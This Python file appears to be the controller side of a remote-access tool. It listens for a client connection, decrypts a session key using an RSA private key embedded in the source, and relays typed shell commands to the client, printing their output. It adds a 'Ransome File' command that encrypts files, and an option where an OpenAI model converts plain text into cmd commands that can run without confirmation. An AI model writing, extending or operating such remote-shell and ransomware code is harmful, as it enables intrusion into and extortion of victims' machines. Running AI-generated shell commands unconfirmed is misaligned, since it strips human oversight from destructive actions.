from RSATD import RSACrypt
from SYMCRYPT import SymCrypt
from  hashlib import sha256
import socket
import openai
import base64

PRIVATEKEY = '''-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAyFXRELCJACflWd1ZTzFo8nPRFv7K0CraQG/j4n4xZGp/g1ap
2YX4Dvh7OMWAImphhIXQxRsSksNpoIFlZ+iu7pqe56Jybujlkvq88SBBUue5bsPs
hARG/A85XHCDDcolwCYEJhPx4kXtPmQxQ0sWuk/cl+Gbak3N8oFTNA248orjm20z
SWe9KqZrWYu3GHrjQQ0OaTMz11i6x914FYyGymlLaY7P3sDrSvjm8Bz4rBO4jEEY
uwTRZh6L7DT7n/XqsHlUgaohyVpCbWmkqxAeUSzWRVD8M6mokPPUbbaJbkalAfU/
P9FmjheA/tvNwIm6t5lF6ZOv56mhTrfJ1tNQ1QIDAQABAoIBABiEB/WW5O0T9Mku
gUNjtIgXDDtYKtGWrOa9ypFpB/pV3gzgiiCIeHa8ibfE041in1RsW8QDMB6tsztl
GlfA7cddPJz0EDTqY029SWnonJXcraCUcVkmfNlTs51QV3lUh5IgFNnkDvG1xPah
pDWr9rgOFdywSyiTJOTMVrZEB6IGjVCUc80l7T08Tn5rCFVJYxXkZKxmViB00lII
u2yKgEojmoT/hldG3UEwSOE1HOt7NZYvlrkZ9fFPbDW3uJSJP9MTHP6iuU+TDVk8
C3IkLYsK9lMz00+7mrBvarMevTNafsV804IJ9tCAIUoSY28LPWnWjacyEhrAIEVC
aXUTG4ECgYEAydpVmg+u+hNEMaBYhFJHIfO9M/GpgaNyH45lkLLVz36hvTBUlfiD
MbezsiOZdHDc7hESslqWMcARdXckoN3PW/eZvZp453LYnTUnZUw5GMep6rAogIoG
UbzSD4PGJvgGLaI5rOx6lpmY5DfwIDcMJUD+QZF4lCai4Di9F8TthAkCgYEA/hND
ICILraru8DhSQ77elIJQ6620xYVlDKQ9YScGfW+pRjE++LFXwTwD5TTD7WvbNbBC
SgJv7lLCeT7t717iXUyiTOuK3Iv+O32sM20m9brHslADoXhjSzVbgi736FUQhKc/
Lb/SH+6nqyJ6YH/082bm4CeYk79sSq544prhkW0CgYA4L1/YbDkmPqqiraE147kN
CE1H4iJuhVJE2lwG9OByyyq2AHfq7quF8T5BfYs/UBMO6Q2tO23HF1FEww8c/+Cy
Fq9iiVbSBbOpvpvipF7YOOtg+fusG786jTZjPyiuvCbsGNW4/nH47XQTQkbCkM/+
pqKfGaDYjBCWHPT1YslCEQKBgQCrc9IrX+4jjqLY5hjVcHsBGoOC1uCTHfZXtolZ
Ax3FDdHb9SV6ayo90sMKLDY/BDaUH1JMYSKpX52udgHYM15r+WfYomY9eBbijGbk
+TZ+QkG6GXapwvS2btZGnm1akfSon7fppnUkaUcqHAUbE533lqwb/Xxfz6BDMUOQ
H1YybQKBgERztTpn8Qyl3wUk8RvlP8b6XKv48zz80ZEf1B+uB5R8e9kPb3P+4V5V
awvJo0SifF4UnOFRtwMPNcyWTC6ZV56mKlTaNkzO/XTWUjgsY8bxd4+SG2zBkdgD
HhbfHJxgi5KEKGH7/lGAkVQ7vrspFYTo/KRnqKt/YuHYAF4fLipm
-----END RSA PRIVATE KEY-----'''



class Socket(object):
    def __init__(self, ip, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((ip, port))
        self.apiKey = False
        
    def translateToCommand(self, apiKey, command):
        openai.api_key = apiKey
        confirm = False
        if command[-13:]=="--autoconfirm":
            confirm = True
            command = command[:-13]
        response = openai.Completion.create(
          model="text-davinci-003",
          prompt=f"Convert this text to a programmatic command in cmd: {command}",
          temperature=0,
          max_tokens=1000
        )
        command = response["choices"][0]["text"].strip()
        if confirm:
            return command
        while True:
            ask = input(f"[+] >> Do you confirm the command - '{command}'? (y/n): ")
            if ask == "y":
                return command
            elif ask == "n":
                return False
        

    def sendMsg(self, msg, conn,key):
        msg = SymCrypt(key).encrypt(msg)
        header = str(len(msg)).encode() #to send to the client the current length of the message
        conn.send(header)
        conn.send(msg) #sending the real message

    def readMsg(self, conn,key):
        header = conn.recv(5)
        msg = conn.recv(int(header.decode()))
        return SymCrypt(key).decrypt(msg).decode()
    
    
    def getSymKey(self,conn):
        global PRIVATEKEY
        prvtkey = RSACrypt().importKey(PRIVATEKEY.encode())
        rsa = RSACrypt(prvtkey)
        print('Trying to recive Symmetric Key')
        while True:
            msg = conn.recv(256)
            print('A message was recived by the client, Loading RSA decyption.')
            print('Successfuly decryptthe key.')
            if msg:
                msg = rsa.decrypt(msg)
                print(F'The shared random key is {base64.b64encode(msg).decode()}')
                return base64.b64encode(msg)

    def Listener(self):
        print("[+] >> Listening!")
        self.server.listen()
        conn, addr = self.server.accept()
        print(f"[+] >> Connection from {addr[0]} has been established! \n")
        key = self.getSymKey(conn)
        return self.connection(key,conn)
                
    
    def connection(self,key,conn):       
            while True:
                command = input("[+] >> Please enter command to be sent to client: ")
                if command == "close":
                    self.server.close()
                if command.startswith('/AI'):
                    if self.apiKey == False:
                        self.apiKey = input('[+] >> Please provide API key: ')
                    command = self.translateToCommand(self.apiKey, command[3:])

                elif command.startswith('Ransome File -p'):
                    key = command.split('-k')[-1].strip()
                    path = command.split('-k')[0].split('-p')[-1].strip()
                    key = sha256(key.encode()).digest()
                    SymCrypt(key).writeTofileEncrypted(path)

                elif command != False:
                    self.sendMsg(command.encode(), conn, key)
                    out = self.readMsg(conn, key)
                    print(out + "\n")

Socket('192.168.137.1', 888).Listener()